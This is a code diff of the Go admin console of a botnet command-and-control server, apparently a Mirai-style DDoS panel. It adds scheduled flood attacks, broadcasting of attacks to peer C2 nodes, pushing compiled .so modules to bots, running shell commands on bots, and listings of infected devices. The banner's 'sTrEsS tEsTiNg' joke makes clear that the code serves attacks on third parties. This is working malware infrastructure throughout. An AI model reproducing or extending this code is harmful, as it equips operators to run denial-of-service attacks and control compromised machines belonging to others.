-			this.conn.Write([]byte("\x1b[38;5;202m  RMUSER      - remove user\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  USERS       - list users\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  BOTS        - distribution + count\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  UPDATE      - update bot binary (all/arch)\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  SELFUPDATE  - run cmd on bots\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTART   - start scanners\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTOP    - stop scanners\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  STOP        - stop attacks\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  SENDMODULE  - send .so module to all bots\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  CALLMODULE  - call function in loaded module\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  LISTMODULES - list loaded modules on bots\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxHeader(CPink + "admin commands")
+			this.R.BoxRow(CPink + "ADDUSER" + CWhiteB + "      — add user")
+			this.R.BoxRow(CPink + "ADDADMIN" + CWhiteB + "     — add admin (*must be admin*)")
+			this.R.BoxRow(CPink + "RMUSER" + CWhiteB + "       — remove user")
+			this.R.BoxRow(CPink + "USERS" + CWhiteB + "        — list users")
+			this.R.BoxRow(CPink + "BOTS" + CWhiteB + "         — distribution + count")
+			this.R.BoxRow(CPink + "UPDATE" + CWhiteB + "       — update bot binary (all/arch)")
+			this.R.BoxRow(CPink + "SELFUPDATE" + CWhiteB + "   — run cmd on bots")
+			this.R.BoxRow(CPink + "SCANSTART" + CWhiteB + "    — start scanners")
+			this.R.BoxRow(CPink + "SCANSTOP" + CWhiteB + "     — stop scanners")
+			this.R.BoxRow(CPink + "STOP" + CWhiteB + "         — stop all attacks")
+			this.R.BoxRow(CPink + "SENDMODULE" + CWhiteB + "   — send .so module to bots")
+			this.R.BoxRow(CPink + "CALLMODULE" + CWhiteB + "   — call func in loaded module")
+			this.R.BoxRow(CPink + "LISTMODULES" + CWhiteB + "  — list loaded modules")
+			this.R.BoxRow(CPink + "BUILDMODULE" + CWhiteB + "  — compile modules/src/<name>.c → .so")
+			this.R.BoxBot(56)
 			continue
 		}
 
@@ -347,23 +469,23 @@ func (this *Admin) Handle() {
 			if userInfo.maxBots != -1 && online > userInfo.maxBots {
 				online = userInfo.maxBots
 			}
-			this.conn.Write([]byte("\x1b[38;5;202m ----------------------------------------\r\n"))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mUser: \x1b[38;5;202m%s\r\n", username)))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mOnline: \x1b[38;5;202m%d\r\n", online)))
 			mbStr := fmt.Sprintf("%d", userInfo.maxBots)
 			if userInfo.maxBots < 0 {
 				mbStr = "unlimited"
 			}
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mMax bots: \x1b[38;5;202m%s\r\n", mbStr)))
 			durStr := "none"
 			if userInfo.durationLimit > 0 {
 				durStr = fmt.Sprintf("%ds", userInfo.durationLimit)
 			} else if userInfo.durationLimit == 0 {
 				durStr = "0 (blocked)"
 			}
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mMax duration: \x1b[38;5;202m%s\r\n", durStr)))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mCooldown: \x1b[38;5;202m%ds\r\n", userInfo.cooldown)))
-			this.conn.Write([]byte("\x1b[38;5;202m ----------------------------------------\r\n"))
+			this.R.BoxTop(38)
+			this.R.BoxRowf(CYellow+"User:"+CWhiteB+"      %s", username)
+			this.R.BoxRowf(CYellow+"Online:"+CWhiteB+"    %d", online)
+			this.R.BoxRowf(CYellow+"Max bots:"+CWhiteB+"  %s", mbStr)
+			this.R.BoxRowf(CYellow+"Max time:"+CWhiteB+"  %s", durStr)
+			this.R.BoxRowf(CYellow+"Cooldown:"+CWhiteB+"  %ds", userInfo.cooldown)
+			this.R.BoxBot(38)
 			continue
 		}
 
@@ -372,18 +494,46 @@ func (this *Admin) Handle() {
 			if userInfo.maxBots != -1 && online > userInfo.maxBots {
 				online = userInfo.maxBots
 			}
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mOnline: \x1b[1;97m%d\x1b[0m\r\n", online)))
+			this.R.Rowf("Online: %d", online)
+			continue
+		}
+
+		if err != nil || cmd == "ACTIVE" || cmd == "active" || cmd == "TOP" || cmd == "top" {
+			this.conn.Write([]byte(formatActiveAttacks()))
+			continue
+		}
+
+		if err != nil || cmd == "PEERS" || cmd == "peers" {
+			if peerMgr == nil {
+				this.R.BoxTop(30)
+				this.R.BoxRow("peering disabled")
+				this.R.BoxBot(30)
+			} else {
+				statuses := peerMgr.PeerStatuses()
+				this.R.BoxTop(50)
+				this.R.BoxRowf(CPink+"Node:"+CWhiteB+" %d", cfg.CncID)
+				for _, s := range statuses {
+					st := CRed + "DOWN"
+					if s.Up {
+						st = CGreen + "UP"
+					}
+					this.R.BoxRowf("peer id=%-3d %s %s", s.ID, st, s.Addr)
+				}
+				this.R.BoxMid(50)
+				this.R.BoxRowf(CYellow+"Local bots:"+CWhiteB+" %d", clientList.BotCount())
+				this.R.BoxBot(50)
+			}
 			continue
 		}
 
 		if err != nil || cmd == "RULES" || cmd == "rules" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════╗ \r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SPAM ATTACKS !               \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SHARE LOGINS !(IP is logged) \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT ATTACK GOVERNMENTS !         \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ONLY USE FOR sTrEsS tEsTiNg :)      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m 3 Warnings = Ban                    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(38)
+			this.R.BoxRow(CRed + "DO NOT SPAM ATTACKS!")
+			this.R.BoxRow(CRed + "DO NOT SHARE LOGINS! (IP is logged)")
+			this.R.BoxRow(CRed + "DO NOT ATTACK GOVERNMENTS!")
+			this.R.BoxRow("ONLY USE FOR sTrEsS tEsTiNg :)")
+			this.R.BoxRow(CRed + "3 Warnings = Ban")
+			this.R.BoxBot(38)
 			continue
 		}
 
@@ -574,7 +724,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
 			continue
 		}
-		if userInfo.admin == 1 && cmd == "*ADDADMIN*" || cmd == "*addadmin*" {
+		if userInfo.admin == 1 && (cmd == "*ADDADMIN*" || cmd == "*addadmin*") {
 			this.conn.Write([]byte("\033[0mUsername:\033[01;97m "))
 			new_un, err := this.ReadLine(false)
 			if err != nil {
@@ -631,7 +781,7 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		if userInfo.admin == 1 && cmd == "rmuser" || cmd == "RMUSER" {
+		if userInfo.admin == 1 && (cmd == "rmuser" || cmd == "RMUSER") {
 			this.conn.Write([]byte("\033[038;5;202mUsername: \033[0;97m"))
 			rm_un, err := this.ReadLine(false)
 			if err != nil {
@@ -653,7 +803,7 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		if userInfo.admin == 1 && cmd == "adduser" || cmd == "ADDUSER" {
+		if userInfo.admin == 1 && (cmd == "adduser" || cmd == "ADDUSER") {
 			this.conn.Write([]byte("enter new username: "))
 			new_un, err := this.ReadLine(false)
 			if err != nil {
@@ -709,14 +859,74 @@ func (this *Admin) Handle() {
 			}
 			continue
 		}
-		if userInfo.admin == 1 && (cmd == "BOTS" || cmd == "bots") {
+		if userInfo.admin == 1 && (cmd == "BOTS" || cmd == "bots" || cmd == "botlist" || cmd == "BOTLIST") {
 			botCount = clientList.Count()
 			m := clientList.Distribution()
-			this.conn.Write([]byte("\x1b[38;5;202m--- distribution ---\x1b[0m\r\n"))
+			this.R.BoxTop(70)
+			this.R.BoxRow(CPink + "Arch distribution:")
 			for k, v := range m {
-				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  %s: \x1b[1;97m%d\r\n", k, v)))
+				this.R.BoxRowf("  %-8s %d", k, v)
 			}
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mTotal: \x1b[1;97m%d\x1b[0m\r\n", botCount)))
+			this.R.BoxMid(70)
+
+			// parse options: BOTS [limit] [@arch] [dns]
+			botLimit := 100
+			archFilter := ""
+			dnsOnly := false
+			if toolArg != "" {
+				opts := strings.Fields(toolArg)
+				for _, o := range opts {
+					if n, e := strconv.Atoi(o); e == nil && n > 0 {
+						botLimit = n
+					} else if strings.HasPrefix(o, "@") {
+						archFilter = strings.TrimPrefix(o, "@")
+					} else if o == "dns" {
+						dnsOnly = true
+					}
+				}
+			}
+
+			shown := 0
+			details := clientList.BotDetails()
+			for _, d := range details {
+				if shown >= botLimit {
+					break
+				}
+				if archFilter != "" && d.Source != archFilter {
+					continue
+				}
+				isDNS := d.RemoteID == -1
+				if dnsOnly && !isDNS {
+					continue
+				}
+				if !dnsOnly && isDNS {
+					continue
+				}
+				verStr := d.Version
+				if verStr == "" {
+					verStr = "?"
+				}
+				capsStr := d.CapFlags
+				if capsStr == "" {
+					capsStr = "?"
+				}
+				nodeStr := "local"
+				if d.RemoteID > 0 {
+					nodeStr = fmt.Sprintf("peer%d", d.RemoteID)
+				}
+				if d.RemoteID == -1 || dnsOnly {
+					nodeStr = "dns"
+				}
+				this.R.BoxRowf("#%-5d %-18s %-7s %-9s [%s] %s",
+					d.Uid, d.Addr, d.Source, verStr, capsStr, nodeStr)
+				shown++
+			}
+			this.R.BoxMid(70)
+			if peerMgr != nil {
+				this.R.BoxRowf(CYellow+"Peers:"+CWhiteB+" %d connected", peerMgr.PeerCount())
+			}
+			this.R.BoxRowf(CYellow+"Total:"+CWhiteB+" %d (showing %d)", botCount, shown)
+			this.R.BoxBot(70)
 			continue
 		}
 		if userInfo.admin == 1 && (cmd == "USERS" || cmd == "users") {
@@ -737,27 +947,51 @@ func (this *Admin) Handle() {
 			if userInfo.maxBots != -1 && online > userInfo.maxBots {
 				online = userInfo.maxBots
 			}
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mBots online: \x1b[1;97m%d\x1b[0m\r\n", online)))
+			this.R.BoxTop(30)
+			this.R.BoxRowf(CYellow+"Online:"+CWhiteB+" %d", online)
+			this.R.BoxBot(30)
 			continue
 		}
-		if cmd[0] == '-' {
-			countSplit := strings.SplitN(cmd, " ", 2)
-			count := countSplit[0][1:]
-			botCount, err = strconv.Atoi(count)
-			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("failed to parse botcount \"%s\"\033[0m\r\n", count)))
+		// handle ! / again — repeat last command
+		if cmd == "!" || cmd == "again" || cmd == "AGAIN" {
+			lastCmdMutex.Lock()
+			replay := lastCmd[username]
+			lastCmdMutex.Unlock()
+			if replay == "" {
+				this.conn.Write([]byte("\x1b[38;5;240mNo previous command\x1b[0m\r\n"))
 				continue
 			}
+			cmd = replay
+		}
+
+		// parse -N and @src from anywhere in command
+		{
+			// store last command for ! / again
+			lastCmdMutex.Lock()
+			lastCmd[username] = cmd
+			lastCmdMutex.Unlock()
+
+			tokens := strings.Fields(cmd)
+			var rest []string
+			for _, tok := range tokens {
+				if len(tok) > 1 && tok[0] == '-' {
+					n, e := strconv.Atoi(tok[1:])
+					if e == nil {
+						botCount = n
+						continue
+					}
+				}
+				if len(tok) > 1 && tok[0] == '@' {
+					botCatagory = tok[1:]
+					continue
+				}
+				rest = append(rest, tok)
+			}
+			cmd = strings.Join(rest, " ")
 			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
 				this.conn.Write([]byte(fmt.Sprintf("bot count to send is bigger than allowed bot maximum\033[0m\r\n")))
 				continue
 			}
-			cmd = countSplit[1]
-		}
-		if cmd[0] == '@' {
-			cataSplit := strings.SplitN(cmd, " ", 2)
-			botCatagory = cataSplit[0][1:]
-			cmd = cataSplit[1]
 		}
 
 		if baseCmd == "SCAN" || baseCmd == "SCANSTART" {
@@ -784,7 +1018,11 @@ func (this *Admin) Handle() {
 				continue
 			}
 			clientList.QueueBuf(BuildAttackStop(), -1, "")
-			this.conn.Write([]byte("\x1b[38;5;202mAttacks stopped on all bots\x1b[0m\r\n"))
+			trackAttackStop()
+			if peerMgr != nil {
+				peerMgr.BroadcastAttackStop()
+			}
+			this.conn.Write([]byte("\x1b[38;5;202mAttacks stopped on all bots + peers\x1b[0m\r\n"))
 			continue
 		}
 		if baseCmd == "UPDATE" && userInfo.admin == 1 {
@@ -824,6 +1062,36 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
 			continue
 		}
+		if baseCmd == "BUILDMODULE" && userInfo.admin == 1 {
+			tokens := strings.Split(toolArg, " ")
+			msg := handleBuildModuleCommand(this, tokens)
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "BUILDMODULE" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+
+		if baseCmd == "MODULES" && userInfo.admin == 1 {
+			msg := handleModulesCommand(this, strings.Split(toolArg, " "))
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "MODULES" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+
+		if baseCmd == "UNLOADMODULE" && userInfo.admin == 1 {
+			msg := handleUnloadModuleCommand(this, strings.Split(toolArg, " "))
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "UNLOADMODULE" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
 
 		if baseCmd == "SELFUPDATE" && userInfo.admin == 1 {
 			shellCmd := toolArg
@@ -857,7 +1125,85 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		atk, err := NewAttack(cmd, userInfo.admin)
+		if baseCmd == "BLACKLIST" || baseCmd == "BL" {
+			if userInfo.admin == 0 {
+				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+				continue
+			}
+			parts := strings.SplitN(toolArg, " ", 2)
+			if len(parts) < 2 {
+				this.conn.Write([]byte("Usage: BLACKLIST add|del <prefix/netmask>\r\n"))
+				continue
+			}
+			action := strings.ToLower(parts[0])
+			prefix := parts[1]
+			if err := database.ManageBlacklist(action, prefix, true); err != nil {
+				msg := err.Error()
+				if strings.HasPrefix(msg, "ok:") {
+					msg = strings.TrimPrefix(msg, "ok:")
+					this.conn.Write([]byte(msg + "\r\n"))
+				} else if msg == "(empty)" {
+					this.conn.Write([]byte("\x1b[38;5;240mNo entries\x1b[0m\r\n"))
+				} else {
+					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", msg)))
+				}
+			} else {
+				if peerMgr != nil {
+					peerMgr.BroadcastWhitelist(action, prefix, true)
+				}
+				this.conn.Write([]byte(fmt.Sprintf("\x1b[32m%s %s\x1b[0m\r\n", action, prefix)))
+			}
+			continue
+		}
+
+		if baseCmd == "WHITELIST" || baseCmd == "WL" {
+			if userInfo.admin == 0 {
+				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+				continue
+			}
+			parts := strings.SplitN(toolArg, " ", 2)
+			if len(parts) < 2 {
+				this.conn.Write([]byte("Usage: WHITELIST add|del <prefix/netmask>\r\n"))
+				continue
+			}
+			action := strings.ToLower(parts[0])
+			prefix := parts[1]
+			if err := database.ManageBlacklist(action, prefix, false); err != nil {
+				msg := err.Error()
+				if strings.HasPrefix(msg, "ok:") {
+					msg = strings.TrimPrefix(msg, "ok:")
+					this.conn.Write([]byte(msg + "\r\n"))
+				} else {
+					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", msg)))
+				}
+			} else {
+				if peerMgr != nil {
+					peerMgr.BroadcastWhitelist(action, prefix, false)
+				}
+				this.conn.Write([]byte(fmt.Sprintf("\x1b[32m%s %s\x1b[0m\r\n", action, prefix)))
+			}
+			continue
+		}
+
+		if baseCmd == "AT" {
+			// AT 14:30 syn 1.2.3.4 60 dport=80
+			parts := strings.SplitN(toolArg, " ", 2)
+			if len(parts) < 2 {
+				this.conn.Write([]byte("Usage: AT HH:MM <attack command>\r\n"))
+				continue
+			}
+			timeStr := parts[0]
+			atkCmd := parts[1]
+			AddScheduledAttack(timeStr, atkCmd, username, botCount, botCatagory)
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[32mScheduled: %s → %s\x1b[0m\r\n", timeStr, atkCmd)))
+			continue
+		}
+
+			if !checkRateLimit(username) {
+				this.conn.Write([]byte("\x1b[91mRate limit: max 5 attacks/sec\x1b[0m\r\n"))
+				continue
+			}
+			atk, err := NewAttack(cmd, userInfo.admin)
 		if err != nil {
 			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
 		} else {
@@ -872,11 +1218,89 @@ func (this *Admin) Handle() {
 					fmt.Println("blocked attack by " + username + " to whitelisted prefix")
 				} else {
 					clientList.QueueBuf(buf, botCount, botCatagory)
+					trackAttackStart(cmd, username, botCatagory, atk.Duration, botCount, 0)
+					if peerMgr != nil {
+						peerMgr.BroadcastAttack(buf, botCount, botCatagory)
+					}
 					this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;34mSent to %d bots\x1b[0m\r\n", botCount)))
 				}
 			}
 		}
 	}
+}
+
+// scheduled attacks
+type scheduledAttack struct {
+	TimeStr string
+	Cmd     string
+	User    string
+	Bots    int
+	Cata    string
+}
+
+var (
+	scheduleMu      sync.Mutex
+	scheduleAttacks []scheduledAttack
+	schedulePath    = "data/schedule.json"
+)
+
+func loadSchedule() {
+	data, err := os.ReadFile(schedulePath)
+	if err != nil {
+		return
+	}
+	scheduleMu.Lock()
+	json.Unmarshal(data, &scheduleAttacks)
+	scheduleMu.Unlock()
+}
+
+func saveSchedule() {
+	scheduleMu.Lock()
+	data, _ := json.Marshal(scheduleAttacks)
+	scheduleMu.Unlock()
+	os.MkdirAll("data", 0755)
+	os.WriteFile(schedulePath, data, 0644)
+}
+
+func AddScheduledAttack(timeStr, cmd, user string, bots int, cata string) {
+	scheduleMu.Lock()
+	scheduleAttacks = append(scheduleAttacks, scheduledAttack{timeStr, cmd, user, bots, cata})
+	scheduleMu.Unlock()
+	saveSchedule()
+}
+
+func startScheduler() {
+	loadSchedule()
+	go func() {
+		for {
+			time.Sleep(30 * time.Second)
+			now := time.Now().Format("15:04")
+			scheduleMu.Lock()
+			var remaining []scheduledAttack
+			for _, sa := range scheduleAttacks {
+				if sa.TimeStr == now {
+					// execute the attack
+					log.Printf("[scheduler] executing: %s (by %s)", sa.Cmd, sa.User)
+					atk, err := NewAttack(sa.Cmd, 1)
+					if err == nil {
+						buf, err := atk.Build()
+						if err == nil {
+							clientList.QueueBuf(buf, sa.Bots, sa.Cata)
+							trackAttackStart(sa.Cmd, sa.User, sa.Cata, atk.Duration, sa.Bots, 0)
+							if peerMgr != nil {
+								peerMgr.BroadcastAttack(buf, sa.Bots, sa.Cata)
+							}
+						}
+					}
+				} else {
+					remaining = append(remaining, sa)
+				}
+			}
+			scheduleAttacks = remaining
+			saveSchedule()
+			scheduleMu.Unlock()
+		}
+	}()
 }
 
 func runLocalCmd(name string, args ...string) (string, error) {
@@ -903,14 +1327,14 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 	}
 
 	redrawLine := func(s string) {
-		this.conn.Write([]byte("\r\033[K"))
+		this.w("\r\033[K")
 		this.R.PromptUser(this.username)
-		this.conn.Write([]byte(s))
+		this.w(s)
 	}
 
 	moveCursorBack := func(n int) {
 		for i := 0; i < n; i++ {
-			this.conn.Write([]byte("\b"))
+			this.w("\b")
 		}
 	}
 
@@ -927,7 +1351,7 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				bufPos--
 				cursorPos--
 				if cursorPos == bufPos {
-					this.conn.Write([]byte("\b \b"))
+					this.w("\b \b")
 				} else {
 					redrawLine(string(buf[:bufPos]))
 					moveCursorBack(bufPos - cursorPos)
@@ -941,7 +1365,7 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				bufPos--
 				cursorPos--
 				if cursorPos == bufPos {
-					this.conn.Write([]byte("\b \b"))
+					this.w("\b \b")
 				} else {
 					redrawLine(string(buf[:bufPos]))
 					moveCursorBack(bufPos - cursorPos)
@@ -953,11 +1377,11 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 			continue
 		}
 		if b == '\n' || b == '\x00' {
-			this.conn.Write([]byte("\r\n"))
+			this.w("\r\n")
 			return string(buf[:bufPos]), nil
 		}
 		if b == 0x03 {
-			this.conn.Write([]byte("^C\r\n"))
+			this.w("^C\r\n")
 			return "", nil
 		}
 		if b == '\x1B' {
@@ -992,9 +1416,9 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				if seq[1] == 'C' {
 					if cursorPos < bufPos {
 						if masked {
-							this.conn.Write([]byte("*"))
+							this.w("*")
 						} else {
-							this.conn.Write([]byte{buf[cursorPos]})
+							this.w(string(buf[cursorPos]))
 						}
 						cursorPos++
 					}
@@ -1003,7 +1427,7 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				if seq[1] == 'D' {
 					if cursorPos > 0 {
 						cursorPos--
-						this.conn.Write([]byte("\b"))
+						this.w("\b")
 					}
 					continue
 				}
@@ -1019,9 +1443,9 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				tail := string(buf[cursorPos:bufPos])
 				cursorPos++
 				if masked {
-					this.conn.Write(bytes.Repeat([]byte("*"), len(tail)))
+					this.w(strings.Repeat("*", len(tail)))
 				} else {
-					this.conn.Write([]byte(tail))
+					this.w(tail)
 				}
 				moveCursorBack(bufPos - cursorPos)
 			} else {
@@ -1029,9 +1453,9 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 				bufPos++
 				cursorPos++
 				if masked {
-					this.conn.Write([]byte("*"))
+					this.w("*")
 				} else {
-					this.conn.Write([]byte{b})
+					this.w(string(b))
 				}
 			}
 		}
